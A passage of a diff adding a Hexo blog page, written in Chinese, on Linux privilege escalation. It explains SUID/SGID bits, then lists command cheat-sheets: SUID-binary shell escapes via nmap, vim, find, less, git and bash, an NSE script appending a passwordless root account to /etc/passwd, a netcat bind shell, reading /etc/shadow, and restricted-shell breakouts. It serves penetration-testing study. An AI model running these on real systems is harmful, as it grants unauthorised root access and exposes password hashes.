@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Linux提权 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="SUID提权SUID GUID Stickybitsuid  4 ,  sgid 2 , Stickybit(粘滞位)  1 Umask: root的umask为0022 ,第一位是上一排提到的, 所以创建文件时就是777-022&#x3D;755, 文件就是 755-111&#x3D;644 除去x(执行权) Stickybit(粘滞位) 12修饰文件夹  文件只有自己和root用户可以修改如&#x2F;tmp目录 所以用户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="http://example.com/2020/11/22/Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SUID提权SUID GUID Stickybitsuid  4 ,  sgid 2 , Stickybit(粘滞位)  1 Umask: root的umask为0022 ,第一位是上一排提到的, 所以创建文件时就是777-022&#x3D;755, 文件就是 755-111&#x3D;644 除去x(执行权) Stickybit(粘滞位) 12修饰文件夹  文件只有自己和root用户可以修改如&#x2F;tmp目录 所以用户">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-11-22T09:33:32.000Z">
+<meta property="article:modified_time" content="2020-12-08T11:23:33.991Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Linux提权" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/11/22/Linux%E6%8F%90%E6%9D%83/" class="article-date">
+  <time class="dt-published" datetime="2020-11-22T09:33:32.000Z" itemprop="datePublished">2020-11-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Linux提权
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="SUID-GUID-Stickybit"><a href="#SUID-GUID-Stickybit" class="headerlink" title="SUID GUID Stickybit"></a>SUID GUID Stickybit</h2><p>suid  4 ,  sgid 2 , Stickybit(粘滞位)  1</p>
+<p>Umask: root的umask为0022 ,第一位是上一排提到的, 所以创建文件时就是777-022=755, 文件就是 755-111=644 除去x(执行权)</p>
+<p>Stickybit(粘滞位)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修饰文件夹  文件只有自己和root用户可以修改</span><br><span class="line">如/tmp目录 所以用户都可创建修改自己文件, 但无法修改其他用户文件(无论是否同一个组)</span><br></pre></td></tr></table></figure>
+
+<p>SGID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用于目录，在该目录下建立的所有文件和目录，属组都继承该目录的属组，且该组内其他成员修改目录内的文件时，其属主和属组都不改变!!  </span><br><span class="line">chmod g+s 目录</span><br><span class="line">当修改文件两个用户是other(other和组内成员)时会改变所属主(所属组不变)</span><br></pre></td></tr></table></figure>
+
+<p>suid有啥用?</p>
+<p>普通用户连/etc/shadow的查看权都没有, 但是要修改密码怎么办, 就是利用passwd的suid, 让passwd以root身份执行 赋予s权限需要本身具有x权限</p>
+<p>chmod  4755  前面的4就是SUID</p>
+<blockquote>
+<p>SUID只对可执行文件有效</p>
+<p>调用者对该文件有执行权</p>
+<p>文件执行过程中 拥有文件所有者权限, 权限仅在执行过程中有效</p>
+</blockquote>
+<p>例子 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">赋予find文件s权限</span><br><span class="line">sudo chmod u+s /usr/bin/find  赋予此权限需要root</span><br><span class="line">find passwd -exec cat /etc/shadow \;  普通用户也可查看/etc/shadow文件了</span><br><span class="line"></span><br><span class="line">sudo chmod u-s /usr/bin/find  去除s权限</span><br><span class="line">find passwd -exec cat /etc/shadow \;提示权限不够了</span><br></pre></td></tr></table></figure>
+
+<h2 id="找到SUID文件"><a href="#找到SUID文件" class="headerlink" title="找到SUID文件"></a>找到SUID文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
+
+<p>-perm用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find -perm mode(0777)  严格匹配, 不足前面自动添0</span><br><span class="line">find -perm -mode(xxxx) 将数字转换为二进制, 1则必须匹配,0则随意(满足要求即可)</span><br><span class="line">find -perm +mode(xxxx) 与-差别就是只需匹配一个权限位的1即可(满足其中一个要求即可)</span><br></pre></td></tr></table></figure>
+
+<h2 id="一般可以利用的文件"><a href="#一般可以利用的文件" class="headerlink" title="一般可以利用的文件"></a>一般可以利用的文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Nmap</span><br><span class="line">Vim</span><br><span class="line">find</span><br><span class="line">Bash</span><br><span class="line">More</span><br><span class="line">Less</span><br><span class="line">Nano</span><br><span class="line">cp</span><br><span class="line">git</span><br><span class="line">wget</span><br></pre></td></tr></table></figure>
+
+<h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在namp 2.02至5.21 拥有交互shell</span><br><span class="line">nmap -v</span><br><span class="line">namp --interactive  开启交互模式</span><br><span class="line">或者通过metaaploit开启</span><br><span class="line">exploit/unix/local/setuid_nmap</span><br></pre></td></tr></table></figure>
+
+<h4 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
+<p>利用nes脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">创建一个nes脚本</span><br><span class="line">a.nes</span><br><span class="line">os.execute(&quot;/bin/bash&quot;)</span><br><span class="line">执行</span><br><span class="line">namp --script=a.nes</span><br><span class="line">但是可能不会成功</span><br><span class="line">方法二</span><br><span class="line">a.nes</span><br><span class="line"></span><br><span class="line">local file = io.open(&quot;/etc/passwd&quot;, &quot;a&quot;)</span><br><span class="line">file:write(&quot;root2::0:0::/root:/bin/bash\n&quot;)</span><br><span class="line">file:close()</span><br><span class="line"></span><br><span class="line">nmap --script=a.nes</span><br><span class="line">su root2  切换到root用户了</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/shadow  可以读取所有文件</span><br><span class="line"></span><br><span class="line">开启shell</span><br><span class="line">vim.tiny</span><br><span class="line"># Press ESC key</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find passwd -exec &#x27;/bin/sh&#x27; \;</span><br><span class="line">或者</span><br><span class="line">find pentestlab -exec netcat -lvp 端口 -e /bin/sh \;</span><br><span class="line">netcat ip 端口</span><br></pre></td></tr></table></figure>
+
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="less-more"><a href="#less-more" class="headerlink" title="less/more"></a>less/more</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd(/etc/shadow)</span><br><span class="line">进入后输入  !/bin/sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git help config 或者git -p help</span><br><span class="line">输入!/bin/sh或者!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>利用wget下载添加有自定义root账户的passwd文件到<code>/etc/passwd</code></p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+suid">https://gtfobins.github.io/#+suid</a></p>
+<h1 id="受限shell突破"><a href="#受限shell突破" class="headerlink" title="受限shell突破"></a>受限shell突破</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/188989.html">https://www.freebuf.com/articles/system/188989.html</a></p>
+<h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">直接利用</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/dash</span><br></pre></td></tr></table></figure>
+
+<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将shell文件移到用户目录然后执行</span><br><span class="line">cp /bin/bash ubash</span><br><span class="line">cp /bin/sh ush</span><br></pre></td></tr></table></figure>
+
+<h3 id="ftp-gdb-man-git-vim-vi-more-less"><a href="#ftp-gdb-man-git-vim-vi-more-less" class="headerlink" title="ftp gdb man git vim/vi more/less"></a>ftp gdb man git vim/vi more/less</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br><span class="line">ftp &gt; !/bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line">gdb &gt; !/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man ls</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git help status</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim/vi</span><br><span class="line">:!/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more/less</span><br><span class="line">!&#x27;sh&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pinfo"><a href="#pinfo" class="headerlink" title="pinfo"></a>pinfo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pinfo ls</span><br><span class="line">!</span><br><span class="line">执行命令</span><br></pre></td></tr></table></figure>
+
+<h2 id="set-shell"><a href="#set-shell" class="headerlink" title="set shell"></a>set shell</h2><p>查看环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export -p</span><br></pre></td></tr></table></figure>
+
+<p>如果为-rx则我们无法写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在vim/vi中设置shell</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">或者在现有shell修改环境变量</span><br><span class="line">export PATH=$PATH:/bin</span><br></pre></td></tr></table></figure>
+
+<h2 id="编程语言提权"><a href="#编程语言提权" class="headerlink" title="编程语言提权"></a>编程语言提权</h2><p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -a then exec(&quot;sh -i&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>perl：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>lua：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.execute(&#x27;/bin/sh&#x27;).</span><br></pre></td></tr></table></figure>
+
+<p>ruby：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/11/22/Linux%E6%8F%90%E6%9D%83/" data-id="ckp231csw0000tcnx2m11hxk5" data-title="Linux提权" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/12/08/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          中间件漏洞
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/11/22/phpmyadmin%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">phpmyadmin漏洞利用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag">漏洞利用</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 15px;">提权</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 10px;">数据结构</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" style="font-size: 20px;">漏洞利用</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/24/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/16/TP5-RCE%E5%88%86%E6%9E%90/">TP5 RCE分析</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/21/vulnstack-%E7%BA%A2%E9%98%9F%E4%B8%80/">vulnstack 红队一</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/08/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/">中间件漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
